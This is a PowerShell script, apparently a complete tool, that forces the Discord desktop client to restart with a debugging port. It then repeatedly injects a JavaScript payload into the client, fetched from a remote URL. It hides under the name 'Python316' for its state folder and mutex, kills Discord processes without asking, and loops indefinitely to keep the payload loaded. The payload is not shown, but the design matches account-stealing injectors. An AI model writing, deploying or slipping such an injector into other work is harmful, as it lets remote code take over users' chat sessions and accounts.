[CmdletBinding()]
param(
    [int]$Port,
    [string]$Root = $PSScriptRoot,
    [string]$MainUrl,
    [string]$MainPath,
    [switch]$Once,
    [switch]$NoRestart,
    [switch]$NoLaunch,
    [switch]$NoDownload,
    [switch]$Quiet
)

$ErrorActionPreference = 'Stop'

# ---------------------------------------------------------------- state / log
$StateDir = Join-Path $env:LOCALAPPDATA 'Python316'
if (-not (Test-Path $StateDir)) { New-Item -ItemType Directory -Path $StateDir -Force | Out-Null }
$LogFile      = Join-Path $StateDir 'injector.log'
$RestartStamp = Join-Path $StateDir 'last_restart.txt'

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = '{0} [{1}] {2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    if (-not $Quiet) { Write-Host $line }
    try {
        if ((Test-Path $LogFile) -and ((Get-Item $LogFile).Length -gt 1048576)) {
            Move-Item $LogFile "$LogFile.old" -Force
        }
        Add-Content -Path $LogFile -Value $line -Encoding UTF8
    } catch {}
}

# ---------------------------------------------------------------- config
$cfg = [pscustomobject]@{}
$configPath = Join-Path $Root 'config.json'
if (Test-Path $configPath) {
    try { $cfg = Get-Content $configPath -Raw | ConvertFrom-Json } catch { Write-Log "config.json parse failed" 'WARN' }
}
if (-not $PSBoundParameters.ContainsKey('Port') -and $cfg.port) { $Port = [int]$cfg.port }
if (-not $Port) { $Port = 9222 }
if (-not $MainUrl -and $cfg.githubRaw) { $MainUrl = [string]$cfg.githubRaw }
if (-not $MainPath) { $MainPath = Join-Path $Root 'main.js' }
$AutoLaunch      = if ($null -ne $cfg.autoLaunch)      { [bool]$cfg.autoLaunch }      else { $true }
$RestartExisting = if ($null -ne $cfg.restartExisting) { [bool]$cfg.restartExisting } else { $true }
$PollSeconds     = if ($cfg.pollSeconds)               { [int]$cfg.pollSeconds }      else { 6 }

# ---------------------------------------------------------------- single instance
$mutex = New-Object System.Threading.Mutex($false, 'Local\Python316Injector')
$hasMutex = $false
try { $hasMutex = $mutex.WaitOne(0) } catch { $hasMutex = $true }
if (-not $hasMutex) {
    Write-Log 'Another injector is already running. Exit.' 'WARN'
    exit 0
}

# ---------------------------------------------------------------- helpers
function Get-DiscordExe {
    $base = Join-Path $env:LOCALAPPDATA 'Discord'
    if (-not (Test-Path $base)) { return $null }
    $apps = Get-ChildItem -LiteralPath $base -Directory -Filter 'app-*' -ErrorAction SilentlyContinue |
        Sort-Object { try { [version]($_.Name -replace '^app-', '') } catch { [version]'0.0.0' } } -Descending
    foreach ($a in $apps) {
        $exe = Join-Path $a.FullName 'Discord.exe'
        if (Test-Path $exe) { return $exe }
    }
    $stub = Join-Path $base 'Discord.exe'
    if (Test-Path $stub) { return $stub }
    return $null
}

function Test-DebugEndpoint {
    try {
        $t = Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 3 -UseBasicParsing
        return $t
    } catch {
        return $null
    }
}

function Wait-DebugEndpoint {
    param([int]$Seconds = 25)
    $deadline = (Get-Date).AddSeconds($Seconds)
    while ((Get-Date) -lt $deadline) {
        $t = Test-DebugEndpoint
        if ($t) { return $t }
        Start-Sleep -Milliseconds 800
    }
    return $null
}

function Restart-Allowed {
    if (-not (Test-Path $RestartStamp)) { return $true }
    try {
        $last = [datetime]::Parse((Get-Content $RestartStamp -Raw).Trim())
        return ((Get-Date) - $last).TotalSeconds -gt 90
    } catch { return $true }
}

function Invoke-CdpEval {
    param([Parameter(Mandatory = $true)][string]$Code)

    $targets = Invoke-RestMethod -Uri ("http://127.0.0.1:{0}/json" -f $Port) -TimeoutSec 5 -UseBasicParsing
    $pages = @($targets | Where-Object { $_.type -eq 'page' -and $_.webSocketDebuggerUrl })
    $page = $pages | Where-Object {
        ($_.url -and $_.url -match 'discord') -or ($_.title -and $_.title -match 'Discord')
    } | Select-Object -First 1
    if (-not $page) { $page = $pages | Select-Object -First 1 }
    if (-not $page) { throw 'No injectable page target found' }

    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ct = [System.Threading.CancellationToken]::None
    [void]$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).GetAwaiter().GetResult()

    try {
        $payload = @{
            id     = 1
            method = 'Runtime.evaluate'
            params = @{
                expression    = $Code
                awaitPromise  = $true
                returnByValue = $true
                userGesture   = $true
            }
        } | ConvertTo-Json -Depth 8 -Compress

        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $seg = New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$bytes)
        [void]$ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).GetAwaiter().GetResult()

        $ms = New-Object System.IO.MemoryStream
        $buf = New-Object byte[] 32768
        while ($true) {
            $segR = New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$buf)
            $res = $ws.ReceiveAsync($segR, $ct).GetAwaiter().GetResult()
            if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { break }
            if ($res.Count -gt 0) { $ms.Write($buf, 0, $res.Count) }
            if ($res.EndOfMessage) { break }
        }
        return [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
    } finally {
        try {
            [void]$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, 'done', $ct).GetAwaiter().GetResult()
        } catch {}
        try { $ws.Dispose() } catch {}
    }
}

function Get-EvalValue {
    param([string]$Text)
    try {
        $o = $Text | ConvertFrom-Json
        if ($o.exceptionDetails) { return $null }
        if ($null -ne $o.result -and $null -ne $o.result.result) { return $o.result.result.value }
        return $null
    } catch { return $null }
}

function Test-Injected {
    try {
        $r = Invoke-CdpEval -Code "typeof window.__python316 !== 'undefined'"
        return [bool](Get-EvalValue -Text $r)
    } catch { return $false }
}

function Get-MainCode {
    if (-not $NoDownload -and $MainUrl) {
        try {
            $sep = if ($MainUrl -match '\?') { '&' } else { '?' }
            $u = '{0}{1}t={2}' -f $MainUrl, $sep, [DateTime]::UtcNow.Ticks
            $code = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20).Content
            if ($code -and $code.Length -gt 50) {
                try { Set-Content -LiteralPath $MainPath -Value $code -Encoding UTF8 } catch {}
                return $code
            }
        } catch {
            Write-Log "Download failed: $($_.Exception.Message)" 'WARN'
        }
    }
    if (Test-Path $MainPath) {
        Write-Log "Using local payload: $MainPath"
        return (Get-Content -LiteralPath $MainPath -Raw)
    }
    throw 'No payload available (download failed and no local main.js)'
}

function Restart-Discord {
    param([string]$Exe)
    if (-not $Exe) { throw 'Discord executable not found' }
    Write-Log 'Stopping Discord to relaunch with the debug port'
    Get-Process -Name Discord -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2
    Start-Process -FilePath $Exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
    Set-Content -LiteralPath $RestartStamp -Value (Get-Date -Format 'o') -Encoding Ascii
}

# ---------------------------------------------------------------- one pass
function Invoke-Pass {
    $exe = Get-DiscordExe
    $procs = Get-Process -Name Discord -ErrorAction SilentlyContinue

    if (-not $procs) {
        if ($NoLaunch -or -not $AutoLaunch) {
            Write-Log 'Discord not running (launch disabled)'
            return
        }
        if (-not $exe) { Write-Log 'Discord not installed' 'WARN'; return }
        Write-Log "Discord not running. Launching with debug port $Port"
        Start-Process -FilePath $exe -ArgumentList ("--remote-debugging-port={0}" -f $Port) | Out-Null
        Wait-DebugEndpoint -Seconds 25 | Out-Null
        return
    }

    $targets = Test-DebugEndpoint
    if (-not $targets) {
        if ($NoRestart -or -not $RestartExisting) {
            Write-Log 'Discord is running without the debug port (restart disabled)'
            return
        }
        if (-not (Restart-Allowed)) {
            Write-Log 'Waiting before another restart attempt'
            return
        }
        Restart-Discord -Exe $exe
        Wait-DebugEndpoint -Seconds 25 | Out-Null
        return
    }

    if (Test-Injected) { return }

    try {
        $code = Get-MainCode
        $resp = Invoke-CdpEval -Code $code
        if (Test-Injected) {
            Write-Log 'main.js injected successfully' 'OK'
        } else {
            $v = Get-EvalValue -Text $resp
            if ($v) { Write-Log "Evaluated: $v" } else { Write-Log 'Injection attempted; marker missing, retrying next poll' 'WARN' }
        }
    } catch {
        Write-Log "Injection error: $($_.Exception.Message)" 'ERR'
    }
}

# ---------------------------------------------------------------- run
Write-Log "Python316 injector starting (port=$Port root=$Root once=$([bool]$Once))"

try {
    if ($Once) {
        Invoke-Pass
    } else {
        while ($true) {
            try { Invoke-Pass } catch { Write-Log "Pass error: $($_.Exception.Message)" 'ERR' }
            Start-Sleep -Seconds $PollSeconds
        }
    }
} finally {
    try { if ($hasMutex) { $mutex.ReleaseMutex() } } catch {}
    try { $mutex.Dispose() } catch {}
}

